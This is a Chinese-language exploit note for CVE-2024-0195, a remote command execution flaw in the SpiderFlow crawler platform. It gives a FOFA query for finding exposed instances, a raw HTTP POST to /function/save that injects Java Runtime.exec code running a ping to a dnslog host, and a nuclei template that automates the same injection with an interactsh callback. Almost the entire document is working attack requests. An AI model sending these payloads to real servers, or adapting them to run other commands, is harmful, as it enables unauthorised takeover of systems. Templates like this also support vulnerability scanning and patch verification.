## SpiderFlow爬虫平台远程命令执行漏洞(CVE-2024-0195)

## fofa
```
app="SpiderFlow"
```

## poc
```
POST /function/save HTTP/1.1
Host: 192.168.40.130:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Connection: close
Content-Length: 121
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

id=1&name=cmd&parameter=rce&script=%7DJava.type('java.lang.Runtime').getRuntime().exec('ping+a4xs0nop.dnslog.pw')%3B%7B
```

## nuclei poc
```
id: CVE-2024-0195

info:
  name: SpiderFlow爬虫平台RCE漏洞
  author: fgz
  severity: critical
  description: SpiderFlow是新一代开源爬虫平台，以图形化方式定义爬虫流程，不写代码即可完成爬虫。基于springboot+layui开发的前后端不分离,也可以进行二次开发，因此收到很多人的喜欢，在gitee上有7.4K Star。该系统/function/save接口存在RCE漏洞，攻击者可以构造恶意命令远控服务器。
  metadata:
    max-request: 1
    fofa-query: app="SpiderFlow"
    verified: true
requests:
  - raw:
      - |+
        POST /function/save HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept: */*
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest
        
        id=1&name=cmd&parameter=rce&script=%7DJava.type('java.lang.Runtime').getRuntime().exec('ping+{{interactsh-url}}')%3B%7B

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and
```
